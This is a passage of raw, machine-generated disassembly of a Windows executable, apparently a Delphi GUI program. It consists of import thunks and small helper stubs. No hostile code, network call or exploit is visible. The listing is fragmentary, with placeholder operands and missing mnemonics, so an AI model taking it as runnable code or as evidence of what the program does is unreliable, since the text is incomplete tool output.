jmp [ GetDiskFreeSpaceA@IAT ]
GetFullPathNameA
jmp [ __import_lookup_table_6(kernel32:GetFullPathNameA) ]
GetLocalTime
jmp [ __import_lookup_table_6(kernel32:GetLocalTime) ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetProfileStringA
jmp [ GetProfileStringA@IAT ]
GetStringTypeExA
jmp [ __import_lookup_table_6(kernel32:GetStringTypeExA) ]
GetSystemInfo
jmp [ __import_lookup_table_6(kernel32:GetSystemInfo) ]
GetSystemTime
jmp [ __import_lookup_table_6(kernel32:GetSystemTime) ]
GetVersion
jmp [ __import_lookup_table_6(kernel32:GetVersion) ]
GetVersionExA
jmp [ __import_lookup_table_6(kernel32:GetVersionExA) ]
GlobalAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalAlloc) ]
GlobalFindAtomA
jmp [ __import_lookup_table_6(kernel32:GlobalFindAtomA) ]
GlobalHandle
jmp [ __import_lookup_table_6(kernel32:GlobalHandle) ]
GlobalReAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalReAlloc) ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ __import_lookup_table_6(kernel32:LoadResource) ]
LockResource
jmp [ __import_lookup_table_6(kernel32:LockResource) ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ ResetEvent@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ __import_lookup_table_6(kernel32:SetEvent) ]
SetFilePointer
jmp [ __import_lookup_table_6(kernel32:SetFilePointer) ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_405fec
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualFree
jmp [ VirtualFree@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ GetFileVersionInfoA@IAT ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
CopyEnhMetaFileA
jmp [ CopyEnhMetaFileA@IAT ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDCA
jmp [ CreateDCA@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreateICA
jmp [ CreateICA@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
DeleteEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:DeleteEnhMetaFile) ]
EndDoc
jmp [ __import_lookup_table_8(gdi32:EndDoc) ]
EndPage
jmp [ __import_lookup_table_8(gdi32:EndPage) ]
ExcludeClipRect
jmp [ ExcludeClipRect@IAT ]
ExtCreatePen
jmp [ ExtCreatePen@IAT ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ __import_lookup_table_8(gdi32:GetDCOrgEx) ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetEnhMetaFileHeader
jmp [ __import_lookup_table_8(gdi32:GetEnhMetaFileHeader) ]
GetPixel
jmp [ __import_lookup_table_8(gdi32:GetPixel) ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetWindowOrgEx
jmp [ __import_lookup_table_8(gdi32:GetWindowOrgEx) ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ MoveToEx@IAT ]
PlayEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:PlayEnhMetaFile) ]
PolyPolyline
jmp [ PolyPolyline@IAT ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ Rectangle@IAT ]
SelectClipRgn
jmp [ SelectClipRgn@IAT ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetEnhMetaFileBits
jmp [ __import_lookup_table_8(gdi32:SetEnhMetaFileBits) ]
SetPixel
jmp [ __import_lookup_table_8(gdi32:SetPixel) ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
UnrealizeObject
jmp [ __import_lookup_table_8(gdi32:UnrealizeObject) ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ CharLowerA@IAT ]
BeginPaint
jmp [ __import_lookup_table_9(user32:BeginPaint) ]
CallNextHookEx
jmp [ __import_lookup_table_9(user32:CallNextHookEx) ]
CallWindowProcA
jmp [ __import_lookup_table_9(user32:CallWindowProcA) ]
CharLowerBuffA
jmp [ CharLowerBuffA@IAT ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ __import_lookup_table_9(user32:CharToOemA) ]
CharUpperBuffA
jmp [ CharUpperBuffA@IAT ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ClientToScreen
jmp [ __import_lookup_table_9(user32:ClientToScreen) ]
CloseClipboard
jmp [ CloseClipboard@IAT ]
CreateIcon
jmp [ __import_lookup_table_9(user32:CreateIcon) ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ __import_lookup_table_9(user32:CreatePopupMenu) ]
DefFrameProcA
jmp [ __import_lookup_table_9(user32:DefFrameProcA) ]
DefMDIChildProcA
jmp [ __import_lookup_table_9(user32:DefMDIChildProcA) ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ DestroyMenu@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFrameControl
jmp [ __import_lookup_table_9(user32:DrawFrameControl) ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
EmptyClipboard
jmp [ __import_lookup_table_9(user32:EmptyClipboard) ]
EnableScrollBar
jmp [ EnableScrollBar@IAT ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
EnumThreadWindows
jmp [ __import_lookup_table_9(user32:EnumThreadWindows) ]
EnumWindows
jmp [ __import_lookup_table_9(user32:EnumWindows) ]
EqualRect
jmp [ __import_lookup_table_9(user32:EqualRect) ]
FindWindowA
jmp [ FindWindowA@IAT ]
GetCaretPos
jmp [ GetCaretPos@IAT ]
GetClassNameA
jmp [ GetClassNameA@IAT ]
GetClientRect
jmp [ __import_lookup_table_9(user32:GetClientRect) ]
GetCursor
jmp [ GetCursor@IAT ]
GetCursorPos
jmp [ GetCursorPos@IAT ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetDoubleClickTime
jmp [ __import_lookup_table_9(user32:GetDoubleClickTime) ]
GetIconInfo
jmp [ __import_lookup_table_9(user32:GetIconInfo) ]
GetKeyNameTextA
jmp [ GetKeyNameTextA@IAT ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetLastActivePopup
jmp [ GetLastActivePopup@IAT ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuStringA
jmp [ __import_lookup_table_9(user32:GetMenuStringA) ]
GetMessageTime
jmp [ GetMessageTime@IAT ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ GetPropA@IAT ]
GetScrollInfo
jmp [ GetScrollInfo@IAT ]
GetScrollPos
jmp [ GetScrollPos@IAT ]
GetScrollRange
jmp [ GetScrollRange@IAT ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ __import_lookup_table_9(user32:GetTopWindow) ]
GetWindow
jmp [ GetWindow@IAT ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ __import_lookup_table_9(user32:GetWindowPlacement) ]
GetWindowRect
jmp [ __import_lookup_table_9(user32:GetWindowRect) ]
GetWindowTextA
jmp [ __import_lookup_table_9(user32:GetWindowTextA) ]
__imp_GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
InsertMenuItemA
jmp [ InsertMenuItemA@IAT ]
IsCharAlphaNumericA
jmp [ IsCharAlphaNumericA@IAT ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ __import_lookup_table_9(user32:IsWindowEnabled) ]
IsZoomed
jmp [ IsZoomed@IAT ]
LoadBitmapA
jmp [ __import_lookup_table_9(user32:LoadBitmapA) ]
LoadIconA
jmp [ __import_lookup_table_9(user32:LoadIconA) ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ __import_lookup_table_9(user32:MapVirtualKeyA) ]
MessageBeep
jmp [ __import_lookup_table_9(user32:MessageBeep) ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
OemToCharA
jmp [ OemToCharA@IAT ]
OpenClipboard
jmp [ OpenClipboard@IAT ]
PeekMessageA
jmp [ __import_lookup_table_9(user32:PeekMessageA) ]
PostQuitMessage
jmp [ __import_lookup_table_9(user32:PostQuitMessage) ]
PtInRect
jmp [ __import_lookup_table_9(user32:PtInRect) ]
RedrawWindow
jmp [ __import_lookup_table_9(user32:RedrawWindow) ]
RegisterClassA
jmp [ __import_lookup_table_9(user32:RegisterClassA) ]
RegisterClipboardFormatA
jmp [ __import_lookup_table_9(user32:RegisterClipboardFormatA) ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ __import_lookup_table_9(user32:SetActiveWindow) ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetForegroundWindow
jmp [ __import_lookup_table_9(user32:SetForegroundWindow) ]
SetKeyboardState
jmp [ SetKeyboardState@IAT ]
SetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ SetParent@IAT ]
SetScrollInfo
jmp [ __import_lookup_table_9(user32:SetScrollInfo) ]
SetScrollPos
jmp [ __import_lookup_table_9(user32:SetScrollPos) ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCursor
jmp [ ShowCursor@IAT ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ __import_lookup_table_9(user32:TranslateMDISysAccel) ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnionRect
jmp [ UnionRect@IAT ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_406820
call GetTickCount
retn
sub_406828
xor eax eax
retn
sub_40682c
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_40683c
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406858
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_40686c
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_4068a4
call sub_406814
retn
CreateWindowExA
jmp [ __import_lookup_table_9(user32:CreateWindowExA) ]
sub_406a81
jmp sub_40387c
sub_406a88
pop ebp
retn
sub_406a8c
sub [ rw-data ] 0x1
retn
sub_406ab9
jmp sub_40387c
sub_406ac0
pop ebp
retn
sub_406ac4
sub [ rw-data ] 0x1
retn
sub_406dc9
jmp sub_40387c
sub_406dd0
pop ebp
retn
sub_406dd4
sub [ rw-data ] 0x1
retn
sub_4078a1
add eax 0xffffffd4
jmp sub_40cb4c
sub_4078b3
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405588
sub_4078bd
add [ esp + 0x4 ] 0xffffffd4
jmp sub_40559c
sub_407c54
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_407c1c
test eax eax
sete al
pop esi
pop ebx
retn
sub_40816c
call sub_408148
retn
sub_408204
push eax
call CloseHandle
retn
sub_4083d4
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_4083e8
push esi
mov esi eax
xchg edx eax
call sub_4028b8
mov eax esi
pop esi
retn
sub_4085a8
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026bc
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_4085bc
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_4085f4
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4026dc
sub_40865c
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402818
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_408680
push ebx
mov ebx eax
mov eax ebx
call sub_403e78
pop ebx
retn
sub_4089e3
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403e78
pop eax
pop ebx
retn
sub_408c9b
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_408df6
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_409153
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_409153
sub_409210
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404338
mov edx esi
xor ecx ecx
call sub_40909c
pop esi
pop ebx
retn
sub_409284
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404338
mov edx esi
mov cl 0x1
call sub_40909c
pop esi
pop ebx
retn
sub_4098fe
jmp sub_40387c
sub_409905
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4099f6
jmp sub_40387c
sub_4099fd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a1a1
jmp sub_40387c
sub_40a1a8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a230
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a1d4
pop ebp
retn 0x8
sub_40a375
jmp sub_40387c
sub_40a37c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40a81f
jmp sub_40387c
sub_40a826
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ad0b
jmp sub_40387c
sub_40ad12
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40adbd
jmp sub_40387c
sub_40adc4
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40ae67
jmp sub_40387c
sub_40ae6e
pop esi
pop ecx
pop ebp
retn
sub_40b04a
jmp sub_40387c
sub_40b051
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b0a8
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b39a
jmp sub_40387c
sub_40b468
jmp sub_40387c
sub_40b490
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_4030dc
sub_40b515
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40b62c
jmp sub_40387c
sub_40b633
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b63c
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_4038b4
sub_40b649
retn
sub_40b64c
push ebp
mov ebp esp
call sub_40b590
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40b63c
pop ebp
retn 0x4
sub_40b668
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
retn
sub_40b700
push ebx
mov ebx eax
mov eax ebx
call sub_40b680
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40b8d3
jmp sub_40387c
sub_40b8da
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b99f
jmp sub_40387c
sub_40b9a6
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40b9b0
call sub_40b23c
mov eax 0x1
call sub_403e60
sub_40bb34
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40bc0d
jmp sub_40387c
sub_40bc2a
jmp sub_40387c
sub_40bc31
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40bcdc
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40bc40
mov ecx eax
sub_40bec8
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40bee8
push eax
call CharNextA
retn
sub_40c198
jmp sub_40387c
sub_40c19f
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c208
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40c65f
jmp sub_40387c
sub_40c666
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ Sleep@IAT ]
sub_40c7a4
jmp sub_40387c
sub_40c7ab
pop ebx
mov esp ebp
pop ebp
retn
sub_40c7b0
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40c714
sub_40c7c0
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40c7dc
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4026dc
pop ebx
retn
sub_40c864
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40c870
xchg [ eax ] edx
mov eax edx
retn
sub_40c8d0
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40c960
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40ca78
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40caa0
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40cd1b
jmp sub_40387c
sub_40cd22
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40cd90
jmp sub_40387c
sub_40cd97
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cdb5
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40cdae
jmp sub_40387c
sub_40cdb5
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d205
jmp sub_40387c
sub_40d20c
pop ebp
retn
sub_40d278
jmp sub_40387c
sub_40d27f
pop ebp
retn
VariantInit
jmp [ __import_lookup_table_11(oleaut32:VariantInit) ]
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40d2f8
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40d35e
jmp sub_40387c
sub_40d365
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d3ca
jmp sub_40387c
sub_40d3d1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d436
jmp sub_40387c
sub_40d43d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d4a2
jmp sub_40387c
sub_40d4a9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d50e
jmp sub_40387c
sub_40d515
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d58d
jmp sub_40387c
sub_40d594
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40d600
jmp sub_40387c
sub_40d607
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40d670
jmp sub_40387c
sub_40d677
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40d6e4
jmp sub_40387c
sub_40d6eb
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
sub_40da71
jmp sub_40387c
sub_40da78
pop ebp
retn
sub_40da7c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40d740
sub_40da8d
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e0ae
jmp sub_40387c
sub_40e0b5
pop ecx
pop ebp
retn
sub_40e147
jmp sub_40387c
sub_40e14e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e19e
jmp sub_40387c
sub_40e1a5
pop ecx
pop ebp
retn
sub_40e237
jmp sub_40387c
sub_40e23e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e28e
jmp sub_40387c
sub_40e295
pop ecx
pop ebp
retn
sub_40e4dd
jmp sub_40387c
sub_40e4e4
pop ebx
mov esp ebp
pop ebp
retn
sub_40e576
jmp sub_40387c
sub_40e57d
pop ecx
pop ebp
retn
sub_40e580
push ebx
mov ebx eax
mov eax ebx
call sub_40e818
mov [ ebx ] 0x1
pop ebx
retn
sub_40e818
test [ eax ] 0xbfe8
jne r-xdata
call sub_40e79c
retn
mov [ eax ] 0x0
retn
sub_40e82c
push eax
call sub_40e818
pop eax
retn
sub_40ea8c
call sub_40eb40
retn
sub_40ecaa
jmp sub_40387c
sub_40ecb1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ed55
jmp sub_40387c
sub_40ed5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ed7e
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404570
retn
sub_40ed77
jmp sub_40387c
sub_40ed7e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40edda
jmp sub_40387c
sub_40ede1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ee5d
jmp sub_40387c
sub_40f3a3
jmp sub_40387c
sub_40f3aa
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f43d
jmp sub_40387c
sub_40f444
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f461
lea eax [ ebp - 0x14 ]
call sub_404558
retn
sub_40f45a
jmp sub_40387c
sub_40f461
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f4be
jmp sub_40387c
sub_40f4c5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f567
jmp sub_40387c
sub_40f584
jmp sub_40387c
sub_40f58b
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fae6
jmp sub_40387c
sub_40faed
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fb98
push eax
call sub_40e818
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_40fbac
push eax
call sub_40e818
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_40fc24
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40eb40
add esp 0x10
sub_40fece
jmp sub_40387c
sub_40fed5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ff18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40e818
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_40ff30
mov edx 0x80020004
call sub_40ff18
retn
sub_40ffc1
jmp sub_40387c
sub_40ffc8
pop esi
pop ebx
pop ebp
retn
sub_40ffcc
push ebp
mov ebp esp
call sub_41018c
pop ebp
retn 0x4
sub_410058
push ebp
mov ebp esp
call sub_41018c
pop ebp
retn 0x4
sub_41013b
jmp sub_40387c
sub_410142
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403118
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40349c
sub_410164
xor eax eax
retn
sub_410168
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_41017c
mov [ ecx ] 0x8
mov al 0x1
retn
sub_410184
call sub_40e064
retn
sub_41018c
call sub_40e154
retn
sub_410194
call sub_40e52c
retn
sub_41019c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4101b0
call sub_41018c
retn
sub_4101b8
push ebp
mov ebp esp
call sub_410194
pop ebp
retn 0x8
sub_4101d0
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_4102ac
jmp sub_40387c
sub_410375
jmp sub_40387c
sub_41037c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410399
lea eax [ ebp - 0x10 ]
call sub_403e78
retn
sub_410392
jmp sub_40387c
sub_410399
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4103a4
call sub_40e580
retn
sub_41041b
jmp sub_40387c
sub_410422
pop ebp
retn
sub_4104c5
jmp sub_40387c
sub_4104cc
pop ebp
retn
sub_410605
jmp sub_40387c
sub_41060c
pop ebp
retn
sub_410610
sub [ rw-data ] 0x1
retn
sub_410644
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_4108c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_403ecc
pop esi
pop ebx
retn
sub_410964
jmp sub_40387c
sub_41096b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_410a66
jmp sub_40387c
sub_410a6d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410c6c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40eb40
pop esi
pop ebx
retn
sub_410dee
jmp sub_40387c
sub_410df5
pop ebp
retn
sub_410df8
sub [ rw-data ] 0x1
retn
sub_410e25
jmp sub_40387c
sub_410e2c
pop ebp
retn
sub_410e30
sub [ rw-data ] 0x1
retn
sub_4120f3
add [ esp + 0x4 ] 0xffffffd8
jmp sub_419a40
sub_4120fd
